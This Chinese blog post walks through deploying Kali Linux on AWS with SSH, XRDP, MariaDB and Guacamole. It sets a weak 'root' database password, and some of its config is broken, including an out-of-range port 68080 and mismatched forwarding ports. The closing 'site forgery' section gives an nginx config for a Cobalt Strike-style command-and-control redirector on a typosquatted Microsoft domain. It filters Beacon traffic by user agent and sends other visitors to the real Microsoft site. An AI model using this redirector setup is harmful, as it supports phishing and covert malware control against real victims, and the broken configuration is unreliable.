---
title: 如何在AWS上部署kali
encrypt: true
enc_pwd: askding
categories:
  - Tools
date: 2022-03-23 19:26:48
top:
tags:
layout:
---
编写进度
- [x] 


# Table of Contents

1.  [AWS部署Kali](#org7589576)
    1.  [创建EC2实例-镜像选择Kali linux](#orgb51cdab)
    2.  [配置Elastic IP](#orge65d382)
    3.  [登录VPS](#orge68705e)
    4.  [启用Root用户,删除kali用户](#org24dd524)
    5.  [配置SSH服务,启用证书登录](#orgfecaa7f)
    6.  [更新系统](#org1666328)
    7.  [部署Guacamole服务](#org39e6c88)
        1.  [部署XRDP服务](#org24ca590)
        2.  [设置mariadb数据库root的密码](#org17c941e)
        3.  [部署Guacamole服务](#org2950233)
        4.  [check相关服务是否开启](#orgdd9e194)
    8.  [配置Guacamole服务](#orgb04fe6a)
        1.  [配置本地ssh config文件](#orga53ae84)
        2.  [访问 http://localhost:18080/guacamole](#org362ef85)
2.  [站点伪造](#orgf4ed444)



<a id="org7589576"></a>

# AWS部署Kali


<a id="orgb51cdab"></a>

## 创建EC2实例-镜像选择Kali linux

[aws-kali部署](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220212114347.png)


<a id="orge65d382"></a>

## 配置Elastic IP

[配置Elastic IP](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220212115507.png)


<a id="orge68705e"></a>

## 登录VPS

    ssh -i ~/.ssh/ed25519_crkmyth1cal  kali@54.199.157.235


<a id="org24dd524"></a>

## 启用Root用户,删除kali用户

    sudo passwd root       # 设置root的密码
    su root                # 切换root用户
    cp /home/kali/.ssh/authorized_keys  /root/.ssh ; exit
    ssh -i ~/.ssh/ed25519_crkmyth1cal  root@54.199.157.235
    userdel -r kali        # 删除用户kali


<a id="orgfecaa7f"></a>

## 配置SSH服务,启用证书登录

    sed -i "s/#Port.*/Port 22222/g" /etc/ssh/sshd_config                        # 修改端口为22222,需修改安全组,开放22222端口
    sed -i "s/#PermitRootLogin.*/PermitRootLogin yes/g" /etc/ssh/sshd_config    # 允许root登陆
    
    sed -i "s/^PasswordAuthentication.*/PasswordAuthentication no/g" /etc/ssh/sshd_config  # 关闭密码认证
    sed -i "s/#PubkeyAuthent.*/PubkeyAuthentication yes/g" /etc/ssh/sshd_config # 启用公钥认证
    sed -i "s/^#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh/authorized_keys/g" /etc/ssh/sshd_config # 启用authorized_keys文件
    
    sed -i "s/^GSSAPIAuthentication.*/GSSAPIAuthentication no/"  /etc/ssh/sshd_config
    sed -i "s/^UseDNS.*/UseDNS no/g"  /etc/ssh/sshd_config
    # Optional
    sed -i "s/^StrictModes.*/StrictModes yes/g"   /etc/ssh/sshd_config          # 严格模式，校验相关目录权限
    sed -i "s/#AllowTcpFor.*/AllowTcpForwarding yes/g" /etc/ssh/sshd_config     # 启用tcp转发
    sed -i "s/#X11Forward.*/X11Forwarding yes/g" /etc/ssh/sshd_config           # 启用X11转发
    sed -i "s/#X11DisplayOffset.*/X11DisplayOffset 10/g" /etc/ssh/sshd_config           # 启用X11转发
    sed -i "s/#TCPKeepAlive yes/TCPKeepAlive yes/g" /etc/ssh/sshd_config        # 防止死连接
    # 开机自启
    systemctl enable ssh && systemctl restart ssh


<a id="org1666328"></a>

## 更新系统

    apt update && apt full-upgrade -y && reboot -f
    apt install -y linux-headers-`uname -r`  nvidia-driver nvidia-cuda-toolkit
    tasksel  # 安装组件-xfce桌面
    apt autoremove && apt autoclean && reboot -f


<a id="org39e6c88"></a>

## 部署Guacamole服务


<a id="org24ca590"></a>

### 部署[XRDP服务](https://www.kali.org/docs/general-use/xfce-with-rdp/)

port=tcp://.:3390

    apt install -y kali-desktop-xfce xrdp                 # 安装xrdp
    sed -i 's/port=3389/port=tcp://.:3390/g' /etc/xrdp/xrdp.ini   # 修改xrdp默认端口,仅本地访问
    systemctl enable xrdp --now                           # 设置开机自启动
    systemctl start xrdp                                  # 启动xrdp服务


<a id="org17c941e"></a>

### 设置mariadb数据库root的密码

参考<https://cloud.tencent.com/developer/article/1512334>

    systemctl enable mysql     # 设置开机自启动
    systemctl restart mysql    # 启动mysql服务
    mysql -u root              # 连接mysql
    MariaDB [(none)]> use mysql;                      # 切换到mysql数据库
    MariaDB [mysql]> SET password=PASSWORD('root');   # 更改root用户密码为root
    MariaDB [mysql]> FLUSH PRIVILEGES;                # 立即生效,无需重启
    exit;                      # 断开mysql


<a id="org2950233"></a>

### 部署Guacamole服务

guacamole配置目录

    tree -l /etc/guacamole                                                                                                      127 ⨯
    /etc/guacamole
    ├── extensions
    │   ├── guacamole-auth-jdbc-mysql-1.4.0.jar
    │   └── guacamole-auth-totp-1.4.0.jar
    ├── guacamole.properties
    ├── guacamole.war
    ├── guacd.conf
    └── lib
        └── mysql-connector-java.jar
    
    2 directories, 6 files

1.  Apache 存在一个错误，它不会将 EDT 视为有效时区。建议修改时区

        ln -sf /usr/share/zoneinfo/US/Central /etc/localtime

2.  [guac-install](https://github.com/MysticRyuujin/guac-install)编译时需添加 `--disable-guacenc` 参数[原因](https://issues.apache.org/jira/browse/GUACAMOLE-1330),否则会报错

    `./configure --with-systemd-dir=/etc/systemd/system --disable-guacenc  &>> ${LOG}`
    
        git clone https://github.com/MysticRyuujin/guac-install.git /tmp/guac-install && cd /tmp/guac-install/
        ./guac-install.sh --totp --nomysql --mysqlhost localhost --mysqlport 3306  --mysqlpwd root --guacpwd guacadmin # 其他参数默认即可,一路回车
        
        Enter Guacamole database name [guacamole_db]:
        Enter Guacamole user [guacamole_user]:
        Read MySQL root's password from command line argument
        Read MySQL guacamole_user's password from command line argument
        Updating apt...
        Found libmariadb-java package (known issues). Will download libmysql-java 8.0.27 and install manually
        Found tomcat9 package...
        Installing packages. This might take a few minutes...
        OK
        Downloading files...
        guacamole-server-1.4.0.tar.gz     100%[===========================================================>]   1.05M  --.-KB/s    in 0.02s
        Downloaded guacamole-server-1.4.0.tar.gz
        guacamole-1.4.0.war               100%[===========================================================>]  12.41M  --.-KB/s    in 0.05s
        Downloaded guacamole-1.4.0.war
        guacamole-auth-jdbc-1.4.0.tar.gz  100%[===========================================================>]  15.72M  --.-KB/s    in 0.1s
        Downloaded guacamole-auth-jdbc-1.4.0.tar.gz
        guacamole-auth-totp-1.4.0.tar.gz  100%[===========================================================>]   4.55M  --.-KB/s    in 0.07s
        Downloaded guacamole-auth-totp-1.4.0.tar.gz
        mysql-connector-java-8.0.27.tar.g 100%[===========================================================>]   4.02M  --.-KB/s    in 0.06s
        Downloaded mysql-connector-java-8.0.27.tar.gz
        Downloading complete.
        
        Building Guacamole-Server with GCC 11.2.0
        Configuring Guacamole-Server. This might take a minute...
        OK
        Running Make on Guacamole-Server. This might take a few minutes...
        OK
        Running Make Install on Guacamole-Server...
        OK
        Moving mysql-connector-java-8.0.27.jar (/etc/guacamole/lib/mysql-connector-java.jar)...
        Moving guacamole-auth-totp-1.4.0.jar (/etc/guacamole/extensions/)...
        Restarting Tomcat service & enable at boot...
        OK
        Created symlink /etc/systemd/system/multi-user.target.wants/tomcat9.service → /lib/systemd/system/tomcat9.service.
        Checking MySQL for existing database (guacamole_db)
        OK
        Checking MySQL for existing user (guacamole_user)
        OK
        Adding database tables...
        OK
        Create guacd.conf file...
        Starting guacd service & enable at boot...
        Created symlink /etc/systemd/system/multi-user.target.wants/guacd.service → /etc/systemd/system/guacd.service.
        Cleanup install files...
        Installation Complete
        - Visit: http://localhost:8080/guacamole/
        - Default login (username/password): guacadmin/guacadmin
        ***Be sure to change the password***.

3.  tomcat加固

    tomcat9配置文件  `/etc/tomcat9/server.xml`
    
    1.  修改tomcat9服务端口
    
            <Connector port="68080" protocol="HTTP/1.1"
                          connectionTimeout="20000"
                          redirectPort="8443" />
    
    2.  限定来源IP
    
        在 `<Host` 标签下新增如下配置
        
            <Valve className="org.apache.catalina.valves.RemoteAddrValve"
               allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1"/>

4.  重启服务

        systemctl restart tomcat9


<a id="orgdd9e194"></a>

### check相关服务是否开启

    systemctl status tomcat9 guacd mariadb xrdp
    netstat -antlp| grep "guacd\|mariadbd\|xrdp*\|java"
    
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1089/mariadbd
    tcp        0      0 0.0.0.0:4822            0.0.0.0:*               LISTEN      40005/guacd
    tcp        0      0 127.0.0.1:3306          127.0.0.1:49114         ESTABLISHED 1089/mariadbd
    tcp6       0      0 :::3390                 :::*                    LISTEN      40649/xrdp
    tcp6       0      0 :::18080                :::*                    LISTEN      41714/java
    tcp6       0      0 ::1:3350                :::*                    LISTEN      40639/xrdp-sesman
    tcp6       0      0 127.0.0.1:49114         127.0.0.1:3306          ESTABLISHED 41714/java


<a id="orgb04fe6a"></a>

## 配置Guacamole服务


<a id="orga53ae84"></a>

### 配置本地ssh config文件

    cat >> ~/.ssh/config <<EOF
    heredoc> Host kali
    heredoc> User root
    heredoc> Port 22222
    heredoc> IdentityFile ~/.ssh/ed25519_crkmyth1cal
    heredoc> LocalForward 68080  localhost:68080
    heredoc> EOF


<a id="org362ef85"></a>

### 访问 <http://localhost:18080/guacamole>

可选:创建新管理员用户，删除原来用户

1.  创建新建连接

    [new-connection](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220212151947.png)


<a id="orgf4ed444"></a>

# 站点伪造

    server {
    	listen 80 ;
       	server_name   support.micorsoft.cn;  #subdomain.your_main_domain.com;
    
    	# Scripted Web Delivery(S)
    	location ~* /a {
    
    		# URI Path   : like axxx (prefix with a)
    		# Local Host : subdomain.domain.com
    		# Local Port : 60080 (Note: **Beacon-HTTP Listener Port bindto 60080**)
    		# Listener   : Beacon-https-port(Beacon Type is https)
    		# Type       : powershell e.t.c what you like
    		# x64        : toggle it in common
    		# SSL        : toggle it in comoon
    
    		proxy_pass https://127.0.0.1:443;
        	#	proxy_set_header Host $http_host;
        	#	proxy_set_header X-Real-IP $remote_addr;
        	#	proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    	}
    
    	# Beacon Communication
    	location ~* /jquery {
    		if ($http_user_agent != "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko") {
    			return 301 https://support.microsoft.com$request_uri ;
           	 	}
    
    		# Lisenter  Settings
    		# Name      : like  https-<port>  just for remember
    		# Payload   : Beacon HTTPS
    		#
    		# HTTP Host:  subdomain.domain.cn
    		#             or cdn ip
    		#
    		#
    		# Host Rotation Strategy : default
    		# HTTPS Host(Stager)     : subdomain.your_main_domain.cn
    		# Profile  :
    		# HTTP Port(C2)     : 8443    this port is nginx proxy_pass to as follow
    		# HTTPS Port(Bind)  :
    		# HTTPS Host Header :  subdomain.your_main_domain.cn
    		# HTTP Proxy        :
    
            	proxy_pass          http://127.0.0.1:808;
     	}
    
    	location = / {
    	# defautl to access to index redirect to support.microsoft.com
    	return 302 https://support.microsoft.com$request_uri ;
    	}
    
    }

